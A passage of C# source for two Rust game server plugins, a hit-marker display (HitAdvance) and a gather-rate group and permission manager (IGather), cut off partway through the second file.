            public Hash<HitType, HitSetting> HitSettings = new Hash<HitType, HitSetting>();

            [JsonProperty("Включить отображение урона по постройкам изначально")]
            public bool DefaultBuildingDamage = true; 
            [JsonProperty("Показывать урон по НПС")]
            public bool ShowNPCDamage = true;
            [JsonProperty("Показывать урон по животным")]
            public bool ShowAnimalDamage = false;
            [JsonProperty("Время удаления маркера (если отсутвует другой урон)")]
            public float DestroyTime = 0.25f;
            [JsonProperty("Укажите название команды для изменения маркера")]
            public string CommandName = "marker";
 
            public static Configuration LoadDefault()
            {
                return new Configuration
                {
                    HitSettings = new Hash<HitType, HitSetting>
                    {
                        [HitType.None] = new HitSetting
                        {
                            DisplayName = "<b><size=20>Маркер полностью отключён</size></b>\n" +
                                    "Вы не будете понимать, когда попадаете \nпо врагу!",
                            Permission = string.Empty,
                            
                            IsDefault = false
                        },
                        [HitType.Line] = new HitSetting
                        {
                            DisplayName = "<b><size=20>Полоса со здоровьем</size></b>\n" +
                                    "Над слотами появляется полоса, она" +
                                    "\nотображает <b>оставшееся</b> здоровье у врага",
                            Permission = "HitAdvance.Line",
                            
                            IsDefault = false
                        },
                        [HitType.Text] = new HitSetting
                        {
                            DisplayName = "<b><size=20>Текст с уроном</size></b>\nПо центру экрана будут всплывать \nцифры с <b>нанесенным</b> уроном!<size=10119></size>",
                            Permission  = "HitAdvance.Text",
                            
                            IsDefault = false
                        },
                        [HitType.LineAndText] = new HitSetting
                        {
                            DisplayName = "<b><size=20>Текст и полоса</size></b>\nДва предыдущих маркера срабатывают <b>одновременно</b>!",
                            Permission  = "HitAdvance.TextAndLine",
                            
                            IsDefault = true
                        },
                        [HitType.Icon] = new HitSetting
                        {
                            DisplayName = "<b><size=20>Иконка попадания</size></b>\nПривычная всем иконка попадения, меняет \nцвет при выстреле <b>в голову</b>!",
                            Permission  = "HitAdvance.Icon",
                            
                            IsDefault = false
                        }
                    }
                };
            }
        }

        #endregion
        
        #region Variables

        private static Configuration Settings = Configuration.LoadDefault();
        private static Hash<ulong, PlayerSettings> PlayerSettingses = new Hash<ulong, PlayerSettings>();

        #endregion

        #region Initialization
        
        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                Settings = Config.ReadObject<Configuration>();
            }
            catch
            {
                PrintWarning($"Error reading config, creating one new config!");
                LoadDefaultConfig();
            }
            
            NextTick(SaveConfig);
        }

        protected override void LoadDefaultConfig() => Settings = Configuration.LoadDefault();
        protected override void SaveConfig() => Config.WriteObject(Settings);
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
        private void OnServerInitialized()               
        {                         
            if (Interface.Oxide.DataFileSystem.ExistsDatafile(Name))
                PlayerSettingses = Interface.Oxide.DataFileSystem.ReadObject<Hash<ulong, PlayerSettings>>(Name);
            
            foreach (var check in Settings.HitSettings.Where(p => !p.Value.Permission.IsNullOrEmpty()))
                permission.RegisterPermission(check.Value.Permission, this);
            
            cmd.AddChatCommand(Settings.CommandName, this, nameof(ChatCommandMarker)); 
            BasePlayer.activePlayerList.ToList().ForEach(OnPlayerConnected);
            timer.Every(60, SaveData);
        }

        private void Unload() => SaveData();
        private void SaveData() => Interface.Oxide.DataFileSystem.WriteObject(Name, PlayerSettingses);

        private void OnPlayerConnected(BasePlayer player)
        {
            player.GetOrAddComponent<PlayerMarker>(); 
            
            if (!PlayerSettingses.ContainsKey(player.userID))
                PlayerSettingses.Add(player.userID, PlayerSettings.Generate());
        }

        private void OnPlayerDisconnected(BasePlayer player)
        {
            var obj = player.GetComponent<PlayerMarker>();
            if (obj != null) UnityEngine.Object.Destroy(obj);
        }

        #endregion

        #region Hooks

        private void OnEntityTakeDamage(BaseCombatEntity entity, HitInfo info)
        {
            var initiator = info?.InitiatorPlayer?.GetComponent<PlayerMarker>();
            if (initiator == null || info.damageTypes.Total() < 1) return;
            int Max = 2742;

            if (entity is BuildingBlock && initiator.GetSettings().BuildingHit)
            {
                NextTick(() =>
                {
                    if (entity != null && !entity.IsDestroyed)
                        initiator.ShowHit(entity, info);  
                });
            }
        }
        
        private void OnPlayerAttack(BasePlayer attacker, HitInfo info)
        {
            var target = info.HitEntity;
            if (attacker.IsNpc || target == null) return;

            if (target is BaseAnimalNPC && !Settings.ShowAnimalDamage || target is BuildingBlock) return;
            if (target is HumanNPC && !Settings.ShowNPCDamage) return;
            
            NextTick(() =>
            {
                if (target != null && !target.IsDestroyed)
                    attacker.GetComponent<PlayerMarker>().ShowHit(target, info);
            });
        }

        #endregion

        #region Commands

        private void ChatCommandMarker(BasePlayer player, string command, string[] args) => UI_DrawInterface(player);

        [ConsoleCommand("UI_HitAdvance")]
        private void consoleCmdChange(ConsoleSystem.Arg args)
        {
            BasePlayer player = args.Player();
            if (player == null || !args.HasArgs(1)) return;

            switch (args.Args[0].ToLower())
            {
                case "choose":
                {
                    if (!args.HasArgs(2)) return;

                    HitType type = HitType.None;
                    if (!Enum.TryParse(args.Args[1], out type)) return;

                    if (!Settings.HitSettings[type].Permission.IsNullOrEmpty() && !permission.UserHasPermission(player.UserIDString, Settings.HitSettings[type].Permission)) return;

                    player.GetComponent<PlayerMarker>().GetSettings().CurrentType = type;
                    UI_DrawInterface(player);
                    break;
                }
                case "toggle":
                {
                    var set = player.GetComponent<PlayerMarker>()?.GetSettings();
                    if (set == null) return;
                    
                    set.BuildingHit = !set.BuildingHit;
                    UI_DrawInterface(player);
                    break;
                }
            }
        }

        #endregion

        #region GUI

        private const string Layer = "UI_HitAdvance_Settings";
        private void UI_DrawInterface(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, Layer);
            CuiElementContainer container = new CuiElementContainer();

            container.Add(new CuiPanel
            {
                CursorEnabled = true,
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                Image = { Color = "0 0 0 0.7" }
            }, "Overlay", Layer); 

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                Button = { Close = Layer, Color = "0 0 0 0" },
                Text = { Text = "" }
            }, Layer);

            container.Add(new CuiLabel
            {
                RectTransform = {AnchorMin = "0 0.75", AnchorMax                                                                   = "1 0.85", OffsetMax              = "0 0"},
                Text          = {Text      = "Вы можете настроить вид хит-маркера под себя, либо полностью отключить его!", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", Color = "1 1 1 0.5", FontSize = 28}
            }, Layer);

            var obj = player.GetComponent<PlayerMarker>();
            if (obj == null) return;
            
            for (int i = 0; i < 6; i += 3)
            {
                float leftPosition = 0 - Settings.HitSettings.Skip(i).Take(3).Count() / 2f * 300 - (Settings.HitSettings.Take(3).Count() - 1) / 2f * 20;

                foreach (var check in Settings.HitSettings.Skip(i).Take(3))
                {
                    string text = "ВЫБРАТЬ МАРКЕР";
                    string color = "1 1 1 0.12";
                    if (obj.GetSettings().CurrentType == check.Key)
                    {
                        text = "МАРКЕР ВЫБРАН";
                        color = "0.70418 1 0.7 0.12";  
                    }
                    else if (!check.Value.Permission.IsNullOrEmpty() && !permission.UserHasPermission(player.UserIDString, check.Value.Permission))
                    {
                        color = "1 0.7 0.7 0.12";
                        text = "НЕДОСТУПЕН ДЛЯ ВЫБОРА";
                    }
                    
                    container.Add(new CuiPanel
                    {
                        RectTransform = {AnchorMin = $"0.5 {0.62 - i * 0.08}", AnchorMax = $"0.5 {0.62 - i * 0.08}", OffsetMin = $"{leftPosition} -50", OffsetMax = $"{leftPosition + 300} 50"},
                        Image         = {Color     = "1 1 1 0.03"}
                    }, Layer, Layer + check.Key);

                    container.Add(new CuiLabel
                    {
                        RectTransform = {AnchorMin = "0 0", OffsetMax              = "1 1", OffsetMin                        = "0 0"},
                        Text          = {Text      = check.Value.DisplayName, Font = "robotocondensed-regular.ttf", FontSize = 14, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1"}
                    }, Layer + check.Key);

                    container.Add(new CuiButton
                    {
                        RectTransform = {AnchorMin = "0 0", AnchorMax = "1 0", OffsetMin = "0 -50", OffsetMax = "0 -10"},
                        Button        = {Color     = color, Command = $"UI_HitAdvance choose {(int) check.Key}" },
                        Text          = {Text      = text, Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 22, Color = "1 1 1 0.4"}
                    }, Layer + check.Key);

                    leftPosition += 320;
                }
            }
                
            string toggleText  = "УРОН ПО ПОСТРОЙКАМ ВЫКЛЮЧЕН";
            string toggleColor = "1 0.7 0.7 0.17";
            if (obj.GetSettings().BuildingHit)
            {
                toggleText  = "УРОН ПО ПОСТРОЙКАМ ВКЛЮЧЕН";
                toggleColor = "0.70418 1 0.7 0.17";
            }
            container.Add(new CuiButton
            {
                RectTransform = {AnchorMin = "0.5 0.1", AnchorMax = "0.5 0.1", OffsetMin = "-210 10", OffsetMax = "190 50"},
                Button        = {Color     = toggleColor, Command = $"UI_HitAdvance toggle" },
                Text          = {Text      = toggleText, Align    = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf", FontSize = 22, Color = "1 1 1 0.4"}
            }, Layer);

            CuiHelper.AddUi(player, container); 
        }
        
        private static string HexToRustFormat(string hex)
        {
            if (string.IsNullOrEmpty(hex))
            {
                hex = "#FFFFFFFF";
            }

            var str = hex.Trim('#');

            if (str.Length == 6)
                str += "FF";

            if (str.Length != 8)
            {
                throw new Exception(hex);
                throw new InvalidOperationException("Cannot convert a wrong format.");
            }

            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
            var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);

            Color color = new Color32(r, g, b, a);

            return string.Format("{0:F2} {1:F2} {2:F2} {3:F2}", color.r, color.g, color.b, color.a);
        }
        
        #endregion

        #region Utils

        public static Vector2 GetRandomTextPosition()
        {
            float x = (float) Oxide.Core.Random.Range(45, 55) / 100;
            float y = (float) Oxide.Core.Random.Range(40, 60) / 100;
            
            return new Vector2(x, y);
        }
        
        public static string GetGradientColor(int count, int max)
        {
            if (count > max)
                count = max;
            float n = max > 0 ? (float)ColorsGradientDB.Length / max : 0;
            var index = (int) (count * n);
            if (index > 0) index--;
            return ColorsGradientDB[ index ];
        }
        
        private static string[] ColorsGradientDB = new string[100]
        {
            "0.2000 0.8000 0.2000 1.0000",
            "0.2471 0.7922 0.1961 1.0000",
            "0.2824 0.7843 0.1922 1.0000",
            "0.3176 0.7725 0.1843 1.0000",
            "0.3451 0.7647 0.1804 1.0000",
            "0.3686 0.7569 0.1765 1.0000",
            "0.3922 0.7490 0.1725 1.0000",
            "0.4118 0.7412 0.1686 1.0000",
            "0.4314 0.7333 0.1647 1.0000",
            "0.4471 0.7216 0.1608 1.0000",
            "0.4667 0.7137 0.1569 1.0000",
            "0.4784 0.7059 0.1529 1.0000",
            "0.4941 0.6980 0.1490 1.0000",
            "0.5098 0.6902 0.1412 1.0000",
            "0.5216 0.6824 0.1373 1.0000",
            "0.5333 0.6706 0.1333 1.0000",
            "0.5451 0.6627 0.1294 1.0000",
            "0.5569 0.6549 0.1255 1.0000",
            "0.5647 0.6471 0.1216 1.0000",
            "0.5765 0.6392 0.1176 1.0000",
            "0.5843 0.6314 0.1137 1.0000",
            "0.5922 0.6235 0.1137 1.0000",
            "0.6039 0.6118 0.1098 1.0000",
            "0.6118 0.6039 0.1059 1.0000",
            "0.6196 0.5961 0.1020 1.0000",
            "0.6275 0.5882 0.0980 1.0000",
            "0.6314 0.5804 0.0941 1.0000",
            "0.6392 0.5725 0.0902 1.0000",
            "0.6471 0.5647 0.0863 1.0000",
            "0.6510 0.5569 0.0824 1.0000",
            "0.6588 0.5451 0.0784 1.0000",
            "0.6627 0.5373 0.0784 1.0000",
            "0.6667 0.5294 0.0745 1.0000",
            "0.6745 0.5216 0.0706 1.0000",
            "0.6784 0.5137 0.0667 1.0000",
            "0.6824 0.5059 0.0627 1.0000",
            "0.6863 0.4980 0.0588 1.0000",
            "0.6902 0.4902 0.0588 1.0000",
            "0.6941 0.4824 0.0549 1.0000",
            "0.6980 0.4745 0.0510 1.0000",
            "0.7020 0.4667 0.0471 1.0000",
            "0.7020 0.4588 0.0471 1.0000",
            "0.7059 0.4471 0.0431 1.0000",
            "0.7098 0.4392 0.0392 1.0000",
            "0.7098 0.4314 0.0392 1.0000",
            "0.7137 0.4235 0.0353 1.0000",
            "0.7176 0.4157 0.0314 1.0000",
            "0.7176 0.4078 0.0314 1.0000",
            "0.7216 0.4000 0.0275 1.0000",
            "0.7216 0.3922 0.0275 1.0000",
            "0.7216 0.3843 0.0235 1.0000",
            "0.7255 0.3765 0.0235 1.0000",
            "0.7255 0.3686 0.0196 1.0000",
            "0.7255 0.3608 0.0196 1.0000",
            "0.7255 0.3529 0.0196 1.0000",
            "0.7294 0.3451 0.0157 1.0000", 
            "0.7294 0.3373 0.0157 1.0000",
            "0.7294 0.3294 0.0157 1.0000",
            "0.7294 0.3216 0.0118 1.0000",
            "0.7294 0.3137 0.0118 1.0000",
            "0.7294 0.3059 0.0118 1.0000",
            "0.7294 0.2980 0.0118 1.0000",
            "0.7294 0.2902 0.0078 1.0000",
            "0.7255 0.2824 0.0078 1.0000",
            "0.7255 0.2745 0.0078 1.0000",
            "0.7255 0.2667 0.0078 1.0000",
            "0.7255 0.2588 0.0078 1.0000",
            "0.7255 0.2510 0.0078 1.0000",
            "0.7216 0.2431 0.0078 1.0000",
            "0.7216 0.2353 0.0039 1.0000",
            "0.7176 0.2275 0.0039 1.0000",
            "0.7176 0.2196 0.0039 1.0000",
            "0.7176 0.2118 0.0039 1.0000",
            "0.7137 0.2039 0.0039 1.0000",
            "0.7137 0.1961 0.0039 1.0000",
            "0.7098 0.1882 0.0039 1.0000",
            "0.7098 0.1804 0.0039 1.0000",
            "0.7059 0.1725 0.0039 1.0000",
            "0.7020 0.1647 0.0039 1.0000",
            "0.7020 0.1569 0.0039 1.0000",
            "0.6980 0.1490 0.0039 1.0000",
            "0.6941 0.1412 0.0039 1.0000",
            "0.6941 0.1333 0.0039 1.0000",
            "0.6902 0.1255 0.0039 1.0000",
            "0.6863 0.1176 0.0039 1.0000",
            "0.6824 0.1098 0.0039 1.0000",
            "0.6784 0.1020 0.0039 1.0000",
            "0.6784 0.0941 0.0039 1.0000",
            "0.6745 0.0863 0.0039 1.0000",
            "0.6706 0.0784 0.0039 1.0000",
            "0.6667 0.0706 0.0039 1.0000",
            "0.6627 0.0627 0.0039 1.0000",
            "0.6588 0.0549 0.0039 1.0000",
            "0.6549 0.0431 0.0039 1.0000",
            "0.6510 0.0353 0.0000 1.0000",
            "0.6471 0.0275 0.0000 1.0000",
            "0.6392 0.0196 0.0000 1.0000",
            "0.6353 0.0118 0.0000 1.0000",
            "0.6314 0.0039 0.0000 1.0000",
            "0.6275 0.0000 0.0000 1.0000",
        };

        #endregion
    }
}

// --- End of file: HitAdvance.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/IGather.cs ---
// --- Original Local Path: IGather.cs ---

using Oxide.Core;
using System;
using System.Reflection;
using System.Collections.Generic;
using UnityEngine;
using System.Linq;
using ConVar;

namespace Oxide.Plugins
{
    [Info("IGather", "DylanSMR", "1.0.9", ResourceId = 1763)]
    [Description("A GUI timer.")]
    class IGather : RustPlugin
    {  
        // / // / // / //
        //Configuration//
        // / // / // / //

        void LoadDefaultConfig()
        {
            PrintWarning("Creating default configuration");
            Config.Clear();
                Config["DefQuarryGatherRate"] = _defQuarryGatherRate;
                Config["DefResourceGatherRate"] = _defResourceGatherRate;
                Config["DefPickupGatherRate"] = _defPickupGatherRate;
                Config["DefPermission"] = _defPermission;
                Config["DefGroupName"] = _defGroupName;
            Config.Save();
        }

        T GetConfig<T>(string name, T defaultValue)
        {
            if (Config[name] == null)
            {
                return defaultValue;
            }

            return (T)Convert.ChangeType(Config[name], typeof(T));
        }   

        // / // / // / //
        //PVC Variables//
        // / // / // / //

        float _defQuarryGatherRate = 1.0f;
        float _defResourceGatherRate = 1.0f;
        float _defPickupGatherRate = 1.0f;

        string _defPermission = "igather.admin";
        string _defGroupName = "Regular";

        string Permission = "";

        public string GroupName;
        public int newcount = 0;

        public bool WipeConfirmV;

        public List<string> nameli = new List<string>();
        public List<ulong>  newadd = new List<ulong>();

        // / // / // / //
        //Data -- Files//
        // / // / // / //

        class GroupData
        {
            public Dictionary<int, Groups> groupD = new Dictionary<int, Groups>();
            public List<string> perms = new List<string>();
            public GroupData(){}
        }

        class Groups
        {
            public string groupName;
            public int groupID;
            public string groupPerm;
            public string groupTimeCreated;
            public float groupQuarryRate;
            public float groupResourceRate;
            public float groupPickupRate;
            public string groupCreater;
            public List<ulong> groupPlayers = new List<ulong>();
            public Groups(){}
        }

        GroupData groupData;

        class PlayerData
        {
            public Dictionary<ulong, Players> playerD = new Dictionary<ulong, Players>();
            public PlayerData(){}
        }

        class Players
        {
            public string playerName;
            public ulong playerID;
            public float playerPickup;
            public float playerQuarry;
            public float playerResource;
            public int playerGroupID;
            public string playerGroupName;
            public Players(){}
        }

        PlayerData playerData;

        // / // / // / //
        //Loading Data-//
        // / // / // / //

        void Loaded()
        {
            groupData = Interface.GetMod().DataFileSystem.ReadObject<GroupData>("IGather-Groups");
            playerData = Interface.GetMod().DataFileSystem.ReadObject<PlayerData>("IGather-Players");   
            LoadDefaultGroups();
            lang.RegisterMessages(messages, this); 
            GroupName = GetConfig("DefGroupName", "");

            LoadPerms();
        }

        void LoadPerms()
        {
            foreach(var p in groupData.perms){
                permission.RegisterPermission(p, this);}
        }

        void LoadDefaultGroups()
        {
            if(!groupData.groupD.ContainsKey(1))
            {
                PrintWarning("Creating default group...");
                try 
                {
                    timer.Once(1, () =>
                    {
                        var info = new Groups();
                        info.groupName = GroupName;
                        info.groupID = 1;
                        info.groupPerm = "igather."+GroupName;
                        info.groupCreater = "Server";
                        info.groupTimeCreated = DateTime.Now.ToString("h:mm tt").ToString();
                        info.groupPlayers = new List<ulong>();
                        info.groupResourceRate = Convert.ToInt64(Config["DefResourceGatherRate"]);
                        info.groupQuarryRate = Convert.ToInt64(Config["DefQuarryGatherRate"]);
                        info.groupPickupRate = Convert.ToInt64(Config["DefPickupGatherRate"]);
                        groupData.groupD.Add(1, info);

                        groupData.perms.Add("igather."+GroupName);

                        timer.Once(1, () => PrintWarning("Group created..."));
                        timer.Once(3, () => LoadDefaultGroups());
                        SaveData();
                        return;
                    });
                }
                catch(System.Exception)
                {
                    return;
                }
            }
            else
            {
                if(groupData.groupD[1].groupName == null)
                {
                    PrintWarning("Default group has a error, re-creating!!!");
                    groupData.groupD.Remove(1);
                    timer.Once(1, () =>
                    {
                        LoadDefaultGroups();
                    });
                    return;
                }
                Puts("Group 1 is configured.");
                return;
            }
        }

        void OnPlayerInit(BasePlayer player)
        {
            if(playerData.playerD.ContainsKey(player.userID))
            {
                return;
            }
            else
            {
                PrintWarning("Creating player data for: "+player.displayName);
                try 
                {
                    var info = new Players();
                    info.playerName = player.displayName;
                    info.playerID = player.userID;
                    info.playerQuarry = groupData.groupD[1].groupQuarryRate;
                    info.playerResource = groupData.groupD[1].groupResourceRate;
                    info.playerPickup = groupData.groupD[1].groupPickupRate;
                    info.playerGroupID = 1;
                    info.playerGroupName = GroupName;
                    playerData.playerD.Add(player.userID, info);

                    groupData.groupD[1].groupPlayers.Add(player.userID);
                    SaveData();

                    PrintWarning(player.displayName+"(s) player data has been created (and/or) saved.");
                }
                catch(System.Exception) 
                {
                    return;
                }
            }
        }

        // / // / // / //
        //Permission Ad//
        // / // / // / //

        void OnGroupPermissionGranted(string name, string perm)
        {
                foreach(var entry in groupData.perms)
                {
                    if(entry == perm)
                    {
                        grabPermG(perm, name);
                    }
                }
        }

        void grabPermG(string perma, string name)
        {
            var newperm = perma.Replace("igather.", "");
            if(groupData.groupD.ContainsKey(newcount))
            {
                if(groupData.groupD[newcount].groupName == newperm)
                {     
                    List<string> players = new List<string>();
                    foreach(var sleeper in BasePlayer.sleepingPlayerList)
                    {
                        players.Add(sleeper.displayName);
                    }
                    foreach(var playera in BasePlayer.activePlayerList)
                    {
                        players.Add(playera.displayName);
                    }
                        foreach(var entry in permission.GetUsersInGroup(name))
                        {
                            foreach(var key in players)
                            {
                                if(entry.Contains(key))
                                { 
                                    var newid = groupData.groupD[newcount].groupID;
                                    object addPlayer = FindPlayerU(key);       
                                    BasePlayer newkey = (BasePlayer)addPlayer;     
                                    if(newkey == null) 
                                    {
                                        Puts($"{key} was a null player, not adding to group!");
                                        break;
                                    }
                                    GrantPermission(newid, newkey);
                                }
                            }
                        }
                    players.Clear();
                    return;
                }
                newcount++;
                grabPermG(perma, name);      
                return;    
            }
            else
            {
                if(newcount < groupData.groupD.Count)
                {
                    newcount++;
                    grabPermG(perma, name);  
                    return;
                }
                else
                {
                    newcount = 0;
                    return;
                }
            }         
        }

        [ConsoleCommand("igGrabPermissions")]
        void PermissionGrab(ConsoleSystem.Arg arg)
        {
            if (arg.Player() != null && !arg.Player().IsAdmin())
            {
                SendReply(arg, lang.GetMessage("NoPermission", this));
                return;
            }
            else
            {
                foreach(var perm in groupData.perms)
                {
                    Puts(perm);
                }
            }
        }

        void GrantPermission(int newid, BasePlayer target)
        {
            groupData.groupD[playerData.playerD[target.userID].playerGroupID].groupPlayers.Remove(target.userID);
            groupData.groupD[Convert.ToInt32(newid)].groupPlayers.Add(target.userID);
            playerData.playerD[target.userID].playerGroupName = groupData.groupD[Convert.ToInt32(newid)].groupName;
            playerData.playerD[target.userID].playerGroupID = groupData.groupD[Convert.ToInt32(newid)].groupID;
            playerData.playerD[target.userID].playerPickup = groupData.groupD[Convert.ToInt32(newid)].groupPickupRate;
            playerData.playerD[target.userID].playerResource = groupData.groupD[Convert.ToInt32(newid)].groupResourceRate;
            playerData.playerD[target.userID].playerQuarry = groupData.groupD[Convert.ToInt32(newid)].groupQuarryRate;
            SaveData();
            SendReply(target, lang.GetMessage("UGAddedT", this), groupData.groupD[Convert.ToInt32(newid)].groupName);
        }

        void grabPerm(string perma, string name)
        {
            var newperm = perma.Replace("igather.", "");
            if(groupData.groupD.ContainsKey(newcount))
            {
                if(groupData.groupD[newcount].groupName == newperm)
                {
                    var newid = groupData.groupD[newcount].groupID;
                    object addPlayer = FindPlayerU(name);             
                    BasePlayer target = (BasePlayer)addPlayer;        
                    GrantPermission(newid, target);
                    return;
                }
                newcount++;
                grabPerm(perma, name);      
                return;    
            }
            else
            {
                if(newcount < groupData.groupD.Count)
                {
                    newcount++;
                    grabPerm(perma, name);  
                    return;
                }
                else
                {
                    newcount = 0;
                    return;
                }
            }         
        }

        void OnUserPermissionGranted(string name, string str)
        {
            foreach(var entry in groupData.perms)
            {
                if(entry == str)
                {
                    grabPerm(str, name);
                }
            }
        }

        void RevokePermission(int newid, BasePlayer target)
        {
            groupData.groupD[playerData.playerD[target.userID].playerGroupID].groupPlayers.Remove(target.userID);
            groupData.groupD[1].groupPlayers.Add(target.userID);
            playerData.playerD[target.userID].playerGroupName = groupData.groupD[1].groupName;
            playerData.playerD[target.userID].playerGroupID = groupData.groupD[1].groupID;
            playerData.playerD[target.userID].playerPickup = groupData.groupD[1].groupPickupRate;
            playerData.playerD[target.userID].playerResource = groupData.groupD[1].groupResourceRate;
            playerData.playerD[target.userID].playerQuarry = groupData.groupD[1].groupQuarryRate;
            SaveData();
            SendReply(target, lang.GetMessage("UGAddedT", this), groupData.groupD[1].groupName);
        }

        void grabPerm2(string perma, string name)
        {
            var newperm = perma.Replace("igather.", "");
            if(groupData.groupD.ContainsKey(newcount))
            {
                if(groupData.groupD[newcount].groupName == newperm)
                {
                    var newid = groupData.groupD[newcount].groupID;
                    object addPlayer = FindPlayerU(name);             
                    BasePlayer target = (BasePlayer)addPlayer;        
                    RevokePermission(newid, target);
                    return;
                }
                newcount++;
                grabPerm2(perma, name);      
                return;    
            }
            else
            {
                if(newcount < groupData.groupD.Count)
                {
                    newcount++;
                    grabPerm2(perma, name);  
                    return;
                }
                else
                {
                    newcount = 0;
                    return;
                }
            }         
        }

        void OnUserPermissionRevoked(string name, string str)
        {
            foreach(var entry in groupData.perms)
            {
                if(entry == str)
                {
                    grabPerm2(str, name);
                }
            }
        }

        // / // / // / //
        //SaveData File//
        // / // / // / //

        void SaveData()
        {
            Interface.Oxide.DataFileSystem.WriteObject("IGather-Groups", groupData);   
            Interface.Oxide.DataFileSystem.WriteObject("IGather-Players", playerData);     
        }

        // / // / // / //
        //Language-File//
        // / // / // / //

        Dictionary<string, string> messages = new Dictionary<string, string>()
        {
            //Permissions//
            {"NoPermission", "You do not have the correct permissions to preform this command!"},
            //Groups//
            {"GroupCreated", "You have created a group with the ID of {id} and a name of {name}."},
            {"GroupCreatedStats", "Your new group has the stats of: "+ "\n" +"Resources: {resource}" + "\n" + "Quarry: {quarry}" + "\n" + "Pickup's (pickup)"},
            {"GroupAlreadyExists", "A group with the name of [{name}] already exists!"},
            {"GroupCreating", "Attempting to create a group!"},
            //Add To Group//
            {"UGNoGroupID", "There is no group of the ID: {id}."},
            {"UGAddedA", "You added {0} to the group of {1}."},
            {"UGAddedT", "You were added to group of {0}."},
            //Remove From Group To Group//
            {"RemoveFrom", "You were removed from group: {0} and you are now in group: {1}."},
            {"RemoveFromA", "You moved {0} from {1} and added him to {2}."},
            //Stats of player//
            {"GatherStats", "{player}'s stats: \n Resources: {resource} \n Quarry: {quarry} \n Pickup: {pickup}."},
            //Wipe//
            {"WGConfirmWipe", "Are you sure you wish to wipe the groups? If so do igconfirm!"},
            {"WGInactive", "There is no wipe timer active currently."},
            {"WGTimerExpired", "You ran out of time to confirm your wipe!"},
            {"WGWiping", "Wiping the statistics of groups now!"},
            {"WGWipingWarn", "{warner} is wiping the groups!"},
            //Set Gather//
            {"SGNoGroupID", "There is no group with the ID of: {0}."},
            {"SGSet", "You set {0}'s group stats to: \n Resource Stats: {1} \n Quarry Stats: {2} \n Pickup Stats: {3}."},
        };     

        // / // / // / //
        //Console Comms//
        // / // / // / //    

        [ConsoleCommand("igcreategroup")]
        void CreateGroupC(ConsoleSystem.Arg arg)
        {
            var id = groupData.groupD.Count() + 1;
            var name = arg.Args[0].ToString();

            var resource = float.Parse(arg.Args[1]);
            var quarry = float.Parse(arg.Args[2]);
            var pickup = float.Parse(arg.Args[3]);

            if (arg.Player() != null && !arg.Player().IsAdmin())
            {
                SendReply(arg, lang.GetMessage("NoPermission", this));
                return;
            }

            SendReply(arg, lang.GetMessage("GroupCreating", this));

            if(TryGroup())
            {
                    if(nameli.Contains(arg.Args[0].ToString()))
                    {
                        SendReply(arg, lang.GetMessage("GroupAlreadyExists", this).Replace("{name}", name));
                        nameli.Clear();
                        return;
                    }
                    timer.Once(5, () =>
                    {
                        if(nameli.Contains(arg.Args[0].ToString()))
                        {
                            SendReply(arg, lang.GetMessage("GroupAlreadyExists", this).Replace("{name}", name));
                            nameli.Clear();
                            return;
                        }
                    });
            }

            var info = new Groups();
            info.groupName = name;
            info.groupID = id;
            info.groupPerm = "igather."+name;
            info.groupCreater = "Console";
            info.groupTimeCreated = DateTime.Now.ToString("h:mm tt").ToString();
            info.groupPlayers = new List<ulong>();
            info.groupResourceRate = resource;
            info.groupQuarryRate = quarry;
            info.groupPickupRate = pickup;
            groupData.groupD.Add(id, info);

            groupData.perms.Add("igather."+name);
            SaveData();
            SendReply(arg, lang.GetMessage("GroupCreated", this).Replace("{name}", name).Replace("{id}", id.ToString()));
            SendReply(arg, lang.GetMessage("GroupCreatedStats", this).Replace("resource", resource.ToString()).Replace("quarry", quarry.ToString()).Replace("pickup", pickup.ToString()));      
            nameli.Clear();    
            LoadPerms();  
        } 

        [ConsoleCommand("igcollectstats")]
        void CollectStatsC(ConsoleSystem.Arg arg)  
        {
            if (arg.Player() != null && !arg.Player().IsAdmin())
            {
                SendReply(arg, lang.GetMessage("NoPermission", this));
                return;
            }
            else
            {
                object addPlayer = FindPlayerC(arg, arg.Args[0]);             
                BasePlayer target = (BasePlayer)addPlayer;        
                if(target == null) return;
                SendReply(arg, lang.GetMessage("GatherStats", this).Replace("player", target.ToString()).Replace("resource", playerData.playerD[target.userID].playerResource.ToString()).Replace("quarry", playerData.playerD[target.userID].playerQuarry.ToString()).Replace("pickup", playerData.playerD[target.userID].playerPickup.ToString()));

                return;
            }
        }

        [ConsoleCommand("igwipegroups")]
        void WipeGroupsC(ConsoleSystem.Arg arg)  
        {
            if (arg.Player() != null && !arg.Player().IsAdmin())
            {
                SendReply(arg, lang.GetMessage("NoPermission", this));
                return;
            }
            else
            {
                SendReply(arg, lang.GetMessage("WGConfirmWipe", this));
                WipeConfirmV = true;
                timer.Once(60, () =>
                {
                    if(WipeConfirmV == false) return;
                    SendReply(arg, lang.GetMessage("WGTimerExpired", this));
                    WipeConfirmV = false;
                });
            }   
        }

        [ConsoleCommand("igconfirm")]
        void ConfirmC(ConsoleSystem.Arg arg)  
        {
            if (arg.Player() != null && !arg.Player().IsAdmin())
            {
                SendReply(arg, lang.GetMessage("NoPermission", this));
                return;
            }
            else if(WipeConfirmV == false)
            {
                SendReply(arg, lang.GetMessage("WGInactive", this));  
                return;
            }
            else
            {
                WipeConfirmV = false;
                SendReply(arg, lang.GetMessage("WGWiping", this));  
                PrintWarning(lang.GetMessage("WGWipingWarn", this).Replace("warner", arg.ToString()));
                AddPlayers();
                groupData.groupD.Clear();
                LoadDefaultGroups();

                foreach(var target in newadd)
                {
